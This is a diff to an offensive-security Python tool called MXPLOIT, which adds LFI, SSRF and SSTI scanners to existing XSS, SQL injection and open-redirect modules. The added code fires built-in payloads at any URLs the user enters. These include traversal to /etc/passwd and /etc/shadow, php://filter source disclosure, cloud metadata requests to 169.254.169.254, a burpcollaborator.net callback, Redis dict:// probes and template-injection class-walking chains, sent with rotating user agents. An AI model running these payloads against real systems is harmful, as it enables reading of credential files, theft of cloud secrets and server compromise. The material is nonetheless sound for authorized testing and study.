@@ -50,7 +50,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
 ]
 
-VERSION = "1.0"
+VERSION = "1.1"
 
 def clear_screen():
     """Clear the terminal screen"""
@@ -59,15 +59,15 @@ def clear_screen():
 def display_banner():
     """Display the MXPLOIT banner"""
     banner = f"""
-{Color.CYAN}{Color.BOLD}
-'##::::'##:'##::::'##:'########::'##::::::::'#######::'####:'########:
- ###::'###:. ##::'##:: ##.... ##: ##:::::::'##.... ##:. ##::... ##..::
- ####'####::. ##'##::: ##:::: ##: ##::::::: ##:::: ##:: ##::::: ##::::
- ## ### ##:::. ###:::: ########:: ##::::::: ##:::: ##:: ##::::: ##::::
- ##. #: ##::: ## ##::: ##.....::: ##::::::: ##:::: ##:: ##::::: ##::::
- ##:.:: ##:: ##:. ##:: ##:::::::: ##::::::: ##:::: ##:: ##::::: ##::::
- ##:::: ##: ##:::. ##: ##:::::::: ########:. #######::'####:::: ##::::
-..:::::..::..:::::..::..:::::::::........:::.......:::....:::::..:::::          
+{Color.RED}{Color.BOLD}
+<-. (`-')   (`-')      _  (`-')                      _     (`-')      
+   \(OO )_  (OO )_.->  \-.(OO )   <-.        .->    (_)    ( OO).->   
+,--./  ,-.) (_| \_)--. _.'    \ ,--. )  (`-')----.  ,-(`-')/    '._   
+|   `.'   | \  `.'  / (_...--'' |  (`-')( OO).-.  ' | ( OO)|'--...__) 
+|  |'.'|  |  \    .') |  |_.' | |  |OO )( _) | |  | |  |  )`--.  .--' 
+|  |   |  |  .'    \  |  .___.'(|  '__ | \|  |)|  |(|  |_/    |  |    
+|  |   |  | /  .'.  \ |  |      |     |'  '  '-'  ' |  |'->   |  |    
+`--'   `--'`--'   '--'`--'      `-----'    `-----'  `--'      `--'    
                                                                  
 {Color.RESET}{Color.YELLOW}Advanced Web Vulnerability Scanner {Color.WHITE}v{VERSION}
 {Color.CYAN}Developed by: YourNameHere
@@ -78,19 +78,15 @@ def display_banner():
 def display_xss_banner():
     """Display the XSS Scanner banner"""
     banner = f"""
-{Color.CYAN}{Color.BOLD}
-__  ____     ____           ____      ____         _     ___      ______      _____________ ________    
-`MM(      )M' 6MMMMb\  6MMMMb\        6MMMMb\   6MMMMb/      dM.    `MM\     `M'`MM\     `M'`MMMMMMMMM `MMMMMMMb.  
- `MM.     d' 6M'    ` 6M'    `       6M'    `  8P    YM     ,MMb     MMM\     M  MMM\     M  MM      \  MM    `Mb  
-  `MM.   d'  MM       MM             MM       6M      Y     d'YM.    M\MM\    M  M\MM\    M  MM         MM     MM  
-   `MM. d'   YM.      YM.            YM.      MM           ,P `Mb    M \MM\   M  M \MM\   M  MM    ,    MM     MM  
-    `MMd      YMMMMb   YMMMMb         YMMMMb  MM           d'  YM.   M  \MM\  M  M  \MM\  M  MMMMMMM    MM    .M9  
-     dMM.         `Mb      `Mb            `Mb MM          ,P   `Mb   M   \MM\ M  M   \MM\ M  MM    `    MMMMMMM9'  
-    d'`MM.         MM       MM             MM MM          d'    YM.  M    \MM\M  M    \MM\M  MM         MM  \M\    
-   d'  `MM.        MM       MM             MM YM      6  ,MMMMMMMMb  M     \MMM  M     \MMM  MM         MM   \M\   
-  d'    `MM. L    ,M9 L    ,M9       L    ,M9  8b    d9  d'      YM. M      \MM  M      \MM  MM      /  MM    \M\  
-_M(_    _)MM_MYMMMM9  MYMMMM9        MYMMMM9    YMMMM9 _dM_     _dMM_M_      \M _M_      \M _MMMMMMMMM _MM_    \M\_
-                                                                                        
+{Color.RED}{Color.BOLD}
+_ (`-')      (`-').-> (`-').->     (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+ (OO )_.->  ( OO)_   ( OO)_       ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+ (_| \_)--.(_)--\_) (_)--\_)     (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+ \  `.'  / /    _ / /    _ /     /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+  \    .') \_..`--. \_..`--.     \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+  .'    \  .-._)   \.-._)   \    .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+ /  .'.  \ \       /\       /    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+`--'   '--' `-----'  `-----'      `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
 {Color.RESET}{Color.YELLOW}Cross-Site Scripting Vulnerability Scanner
 {Color.RESET}
     """
@@ -99,15 +95,15 @@ _M(_    _)MM_MYMMMM9  MYMMMM9        MYMMMM9    YMMMM9 _dM_     _dMM_M_      \M 
 def display_sqli_banner():
     """Display the SQL Injection Scanner banner"""
     banner = f"""
-{Color.CYAN}{Color.BOLD}
-   /$$$$$$   /$$$$$$  /$$       /$$$$$$        /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$ 
- /$$__  $$ /$$__  $$| $$      |_  $$_/       /$$__  $$ /$$__  $$ /$$__  $$| $$$ | $$| $$$ | $$| $$_____/| $$__  $$
-| $$  \__/| $$  \ $$| $$        | $$        | $$  \__/| $$  \__/| $$  \ $$| $$$$| $$| $$$$| $$| $$      | $$  \ $$
-|  $$$$$$ | $$  | $$| $$        | $$        |  $$$$$$ | $$      | $$$$$$$$| $$ $$ $$| $$ $$ $$| $$$$$   | $$$$$$$/
- \____  $$| $$  | $$| $$        | $$         \____  $$| $$      | $$__  $$| $$  $$$$| $$  $$$$| $$__/   | $$__  $$
- /$$  \ $$| $$/$$ $$| $$        | $$         /$$  \ $$| $$    $$| $$  | $$| $$\  $$$| $$\  $$$| $$      | $$  \ $$
-|  $$$$$$/|  $$$$$$/| $$$$$$$$ /$$$$$$      |  $$$$$$/|  $$$$$$/| $$  | $$| $$ \  $$| $$ \  $$| $$$$$$$$| $$  | $$
- \______/  \____ $$$|________/|______/       \______/  \______/ |__/  |__/|__/  \__/|__/  \__/|________/|__/  |__/
+{Color.RED}{Color.BOLD}
+ (`-').-> <-.(`-')            _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+ ( OO)_    __( OO)    <-.    (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+(_)--\_)  '-'---\_) ,--. )   ,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+/    _ / |  .-.  |  |  (`-') | ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+\_..`--. |  | | <-' |  |OO ) |  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+.-._)   \|  | |  | (|  '__ |(|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+\       /'  '-'  '-.|     |' |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+ `-----'  `-----'--'`-----'  `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                                       
 {Color.RESET}{Color.YELLOW}SQL Injection Vulnerability Scanner
 {Color.RESET}
@@ -117,17 +113,71 @@ def display_sqli_banner():
 def display_or_banner():
     """Display the Open Redirect Scanner banner"""
     banner = f"""
-{Color.CYAN}{Color.BOLD}
-.d88888b.  8888888b.        .d8888b.   .d8888b.        d8888 888b    888 888b    888 8888888888 8888888b.  
-d88P" "Y88b 888   Y88b      d88P  Y88b d88P  Y88b      d88888 8888b   888 8888b   888 888        888   Y88b 
-888     888 888    888      Y88b.      888    888     d88P888 88888b  888 88888b  888 888        888    888 
-888     888 888   d88P       "Y888b.   888           d88P 888 888Y88b 888 888Y88b 888 8888888    888   d88P 
-888     888 8888888P"           "Y88b. 888          d88P  888 888 Y88b888 888 Y88b888 888        8888888P"  
-888     888 888 T88b              "888 888    888  d88P   888 888  Y88888 888  Y88888 888        888 T88b   
-Y88b. .d88P 888  T88b       Y88b  d88P Y88b  d88P d8888888888 888   Y8888 888   Y8888 888        888  T88b  
- "Y88888P"  888   T88b       "Y8888P"   "Y8888P" d88P     888 888    Y888 888    Y888 8888888888 888   T88b 
+{Color.RED}{Color.BOLD}
+              (`-')      (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+     .->   <-.(OO )      ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+(`-')----. ,------,)    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+( OO).-.  '|   /`. '    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+( _) | |  ||  |_.' |    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+ \|  |)|  ||  .   .'    .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+  '  '-'  '|  |\  \     \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+   `-----' `--' '--'     `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
                                                                                                                 
 {Color.RESET}{Color.YELLOW}Open Redirect Vulnerability Scanner
+{Color.RESET}
+    """
+    print(banner)
+
+def display_lfi_banner():
+    """Display the LFI Scanner banner"""
+    banner = f"""
+{Color.RED}{Color.BOLD}
+                     _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+   <-.      <-.     (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+ ,--. )  (`-')-----.,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+ |  (`-')(OO|(_\---'| ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+ |  |OO ) / |  '--. |  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+(|  '__ | \_)  .--'(|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+ |     |'  `|  |_)  |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+ `-----'    `--'    `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
+                                                                                            
+{Color.RESET}{Color.YELLOW}Local File Inclusion Vulnerability Scanner
+{Color.RESET}
+    """
+    print(banner)
+
+def display_ssrf_banner():
+    """Display the SSRF Scanner banner"""
+    banner = f"""
+{Color.RED}{Color.BOLD}
+ (`-').-> (`-').->   (`-')                 (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+ ( OO)_   ( OO)_  <-.(OO )    <-.          ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+(_)--\_) (_)--\_) ,------,)(`-')-----.    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+/    _ / /    _ / |   /`. '(OO|(_\---'    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+\_..`--. \_..`--. |  |_.' | / |  '--.     \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+.-._)   \.-._)   \|  .   .' \_)  .--'     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+\       /\       /|  |\  \   `|  |_)      \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+ `-----'  `-----' `--' '--'   `--'         `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
+                                                                                                
+{Color.RESET}{Color.YELLOW}Server-Side Request Forgery Vulnerability Scanner
+{Color.RESET}
+    """
+    print(banner)
+
+def display_ssti_banner():
+    """Display the SSTI Scanner banner"""
+    banner = f"""
+{Color.RED}{Color.BOLD}
+ (`-').-> (`-').->(`-')      _          (`-').->           (`-')  _ <-. (`-')_ <-. (`-')_  (`-')  _   (`-')  
+ ( OO)_   ( OO)_  ( OO).->  (_)         ( OO)_   _         (OO ).-/    \( OO) )   \( OO) ) ( OO).-/<-.(OO )  
+(_)--\_) (_)--\_) /    '._  ,-(`-')    (_)--\_)  \-,-----. / ,---.  ,--./ ,--/ ,--./ ,--/ (,------.,------,) 
+/    _ / /    _ / |'--...__)| ( OO)    /    _ /   |  .--./ | \ /`.\ |   \ |  | |   \ |  |  |  .---'|   /`. ' 
+\_..`--. \_..`--. `--.  .--'|  |  )    \_..`--.  /_) (`-') '-'|_.' ||  . '|  |)|  . '|  |)(|  '--. |  |_.' | 
+.-._)   \.-._)   \   |  |  (|  |_/     .-._)   \ ||  |OO )(|  .-.  ||  |\    | |  |\    |  |  .--' |  .   .' 
+\       /\       /   |  |   |  |'->    \       /(_'  '--'\ |  | |  ||  | \   | |  | \   |  |  `---.|  |\  \  
+ `-----'  `-----'    `--'   `--'        `-----'    `-----' `--' `--'`--'  `--' `--'  `--'  `------'`--' '--' 
+                                                                                                      
+{Color.RESET}{Color.YELLOW}Server-Side Template Injection Vulnerability Scanner
 {Color.RESET}
     """
     print(banner)
@@ -135,10 +185,13 @@ Y88b. .d88P 888  T88b       Y88b  d88P Y88b  d88P d8888888888 888   Y8888 888   
 def display_menu():
     """Display the main menu"""
     print(f"\n{Color.BOLD}{Color.WHITE}Main Menu:{Color.RESET}")
-    print(f"{Color.GREEN}[1] XSS Scanner")
-    print(f"{Color.BLUE}[2] SQL Injection Scanner")
-    print(f"{Color.MAGENTA}[3] Open Redirect Scanner")
-    print(f"{Color.RED}[4] Exit{Color.RESET}")
+    print(f"{Color.WHITE}[1] XSS Scanner")
+    print(f"{Color.WHITE}[2] SQL Injection Scanner")
+    print(f"{Color.WHITE}[3] Open Redirect Scanner")
+    print(f"{Color.WHITE}[4] LFI Scanner")
+    print(f"{Color.WHITE}[5] SSRF Scanner")
+    print(f"{Color.WHITE}[6] SSTI Scanner")
+    print(f"{Color.WHITE}[7] Exit{Color.RESET}")
 
 def press_enter_to_continue():
     """Prompt to press Enter and return to main menu"""
@@ -238,6 +291,53 @@ def prompt_for_payloads(default_file=None, scan_type=None):
                         "/%3f/google.com",
                         "/%26/google.com",
                         "/%3d/google.com"
+                    ]
+                elif scan_type == "LFI":
+                    return [
+                        "../../../../../../../../etc/passwd",
+                        "../../../../../../../../etc/shadow",
+                        "../../../../../../../../windows/win.ini",
+                        "../../../../../../../../windows/system.ini",
+                        "....//....//....//....//....//....//....//etc/passwd",
+                        "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+                        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+                        "file:///etc/passwd",
+                        "file:///c:/windows/win.ini",
+                        "php://filter/convert.base64-encode/resource=index.php"
+                    ]
+                elif scan_type == "SSRF":
+                    return [
+                        "http://localhost",
+                        "http://127.0.0.1",
+                        "http://169.254.169.254/latest/meta-data/",
+                        "http://[::1]",
+                        "http://2130706433",  # 127.0.0.1 as integer
+                        "http://0x7f000001",  # 127.0.0.1 as hex
+                        "http://0177.0.0.1",  # 127.0.0.1 as octal
+                        "http://localtest.me",
+                        "http://burpcollaborator.net",
+                        "dict://localhost:6379/info"
+                    ]
+                elif scan_type == "SSTI":
+                    return [
+                        "{{7*7}}",
+                        "${7*7}",
+                        "#{7*7}",
+                        "<%= 7*7 %>",
+                        "${{7*7}}",
+                        "@(7*7)",
+                        "{{config}}",
+                        "${config}",
+                        "#{config}",
+                        "<%= config %>",
+                        "${{config}}",
+                        "@(config)",
+                        "{{''.__class__.__mro__[1].__subclasses__()}}",
+                        "${''.class.mro[1].subclasses()}",
+                        "#{''.class.mro[1].subclasses()}",
+                        "<%= ''.class.mro[1].subclasses() %>",
+                        "${{''.class.mro[1].subclasses()}}",
+                        "@(''.class.mro[1].subclasses())"
                     ]
                 else:
                     return []
@@ -554,6 +654,249 @@ def scan_open_redirect(url, payload, driver):
     
     return None
 
+# LFI Scanner Functions
+def run_lfi_scanner():
+    """Main LFI scanning function"""
+    clear_screen()
+    display_lfi_banner()
+    
+    urls = prompt_for_urls()
+    payloads = prompt_for_payloads("lfi_payloads.txt", "LFI")
+    
+    vulnerable_urls = []
+    total_scanned = 0
+    start_time = time.time()
+    
+    try:
+        session = get_retry_session()
+        
+        for url in urls:
+            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
+            for payload in payloads:
+                result = scan_lfi(url, payload, session)
+                total_scanned += 1
+                if result:
+                    vulnerable_urls.append(result)
+    
+    except KeyboardInterrupt:
+        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
+    
+    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
+    save_results(vulnerable_urls, "LFI")
+    press_enter_to_continue()
+
+def scan_lfi(url, payload, session):
+    """Scan a single URL for LFI vulnerabilities"""
+    headers = {'User-Agent': get_random_user_agent()}
+    parsed = urllib.parse.urlparse(url)
+    
+    # Test in query parameters
+    if parsed.query:
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        for param in params:
+            modified_params = params.copy()
+            modified_params[param] = [payload]
+            test_url = urllib.parse.urlunparse(
+                parsed._replace(
+                    query=urllib.parse.urlencode(modified_params, doseq=True)
+                )
+            )
+            
+            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
+            
+            try:
+                response = session.get(test_url, headers=headers, timeout=10, verify=False)
+                
+                # Check for common LFI indicators in response
+                if "root:" in response.text or "[extensions]" in response.text or "mysql" in response.text.lower():
+                    print(f"{Color.GREEN}[✓] Potential LFI Found: {test_url}{Color.RESET}")
+                    return test_url
+                
+                print(f"{Color.RED}[✗] No LFI: {param}{Color.RESET}")
+                
+            except Exception as e:
+                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    # Also test in path
+    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
+    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
+    
+    try:
+        response = session.get(test_url, headers=headers, timeout=10, verify=False)
+        
+        if "root:" in response.text or "[extensions]" in response.text or "mysql" in response.text.lower():
+            print(f"{Color.GREEN}[✓] Potential LFI Found: {test_url}{Color.RESET}")
+            return test_url
+        
+        print(f"{Color.RED}[✗] No LFI in path{Color.RESET}")
+        
+    except Exception as e:
+        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    return None
+
+# SSRF Scanner Functions
+def run_ssrf_scanner():
+    """Main SSRF scanning function"""
+    clear_screen()
+    display_ssrf_banner()
+    
+    urls = prompt_for_urls()
+    payloads = prompt_for_payloads("ssrf_payloads.txt", "SSRF")
+    
+    vulnerable_urls = []
+    total_scanned = 0
+    start_time = time.time()
+    
+    try:
+        session = get_retry_session()
+        
+        for url in urls:
+            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
+            for payload in payloads:
+                result = scan_ssrf(url, payload, session)
+                total_scanned += 1
+                if result:
+                    vulnerable_urls.append(result)
+    
+    except KeyboardInterrupt:
+        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
+    
+    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
+    save_results(vulnerable_urls, "SSRF")
+    press_enter_to_continue()
+
+def scan_ssrf(url, payload, session):
+    """Scan a single URL for SSRF vulnerabilities"""
+    headers = {'User-Agent': get_random_user_agent()}
+    parsed = urllib.parse.urlparse(url)
+    
+    # Test in query parameters
+    if parsed.query:
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        for param in params:
+            modified_params = params.copy()
+            modified_params[param] = [payload]
+            test_url = urllib.parse.urlunparse(
+                parsed._replace(
+                    query=urllib.parse.urlencode(modified_params, doseq=True)
+                )
+            )
+            
+            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
+            
+            try:
+                response = session.get(test_url, headers=headers, timeout=10, verify=False)
+                
+                # Check if the response contains data from our test payload
+                if "169.254.169.254" in response.text or "metadata" in response.text.lower():
+                    print(f"{Color.GREEN}[✓] Potential SSRF Found: {test_url}{Color.RESET}")
+                    return test_url
+                
+                print(f"{Color.RED}[✗] No SSRF: {param}{Color.RESET}")
+                
+            except Exception as e:
+                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    # Also test in path
+    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
+    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
+    
+    try:
+        response = session.get(test_url, headers=headers, timeout=10, verify=False)
+        
+        if "169.254.169.254" in response.text or "metadata" in response.text.lower():
+            print(f"{Color.GREEN}[✓] Potential SSRF Found: {test_url}{Color.RESET}")
+            return test_url
+        
+        print(f"{Color.RED}[✗] No SSRF in path{Color.RESET}")
+        
+    except Exception as e:
+        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    return None
+
+# SSTI Scanner Functions
+def run_ssti_scanner():
+    """Main SSTI scanning function"""
+    clear_screen()
+    display_ssti_banner()
+    
+    urls = prompt_for_urls()
+    payloads = prompt_for_payloads("ssti_payloads.txt", "SSTI")
+    
+    vulnerable_urls = []
+    total_scanned = 0
+    start_time = time.time()
+    
+    try:
+        session = get_retry_session()
+        
+        for url in urls:
+            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
+            for payload in payloads:
+                result = scan_ssti(url, payload, session)
+                total_scanned += 1
+                if result:
+                    vulnerable_urls.append(result)
+    
+    except KeyboardInterrupt:
+        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
+    
+    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
+    save_results(vulnerable_urls, "SSTI")
+    press_enter_to_continue()
+
+def scan_ssti(url, payload, session):
+    """Scan a single URL for SSTI vulnerabilities"""
+    headers = {'User-Agent': get_random_user_agent()}
+    parsed = urllib.parse.urlparse(url)
+    
+    # Test in query parameters
+    if parsed.query:
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        for param in params:
+            modified_params = params.copy()
+            modified_params[param] = [payload]
+            test_url = urllib.parse.urlunparse(
+                parsed._replace(
+                    query=urllib.parse.urlencode(modified_params, doseq=True)
+                )
+            )
+            
+            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
+            
+            try:
+                response = session.get(test_url, headers=headers, timeout=10, verify=False)
+                
+                # Check if the response contains the evaluated payload
+                if "49" in response.text and ("7*7" in payload or "7*7" in response.text):
+                    print(f"{Color.GREEN}[✓] Potential SSTI Found: {test_url}{Color.RESET}")
+                    return test_url
+                
+                print(f"{Color.RED}[✗] No SSTI: {param}{Color.RESET}")
+                
+            except Exception as e:
+                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    # Also test in path
+    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
+    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
+    
+    try:
+        response = session.get(test_url, headers=headers, timeout=10, verify=False)
+        
+        if "49" in response.text and ("7*7" in payload or "7*7" in response.text):
+            print(f"{Color.GREEN}[✓] Potential SSTI Found: {test_url}{Color.RESET}")
+            return test_url
+        
+        print(f"{Color.RED}[✗] No SSTI in path{Color.RESET}")
+        
+    except Exception as e:
+        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
+    
+    return None
+
 def main():
     """Main program loop"""
     clear_screen()
@@ -561,7 +904,7 @@ def main():
     
     while True:
         display_menu()
-        choice = input(f"\n{Color.CYAN}[?] Select an option (1-4): {Color.RESET}").strip()
+        choice = input(f"\n{Color.CYAN}[?] Select an option (1-7): {Color.RESET}").strip()
         
         if choice == '1':
             run_xss_scanner()
@@ -570,6 +913,12 @@ def main():
         elif choice == '3':
             run_or_scanner()
         elif choice == '4':
+            run_lfi_scanner()
+        elif choice == '5':
+            run_ssrf_scanner()
+        elif choice == '6':
+            run_ssti_scanner()
+        elif choice == '7':
             print(f"\n{Color.YELLOW}[*] Exiting MXPLOIT...{Color.RESET}")
             sys.exit(0)
         else:
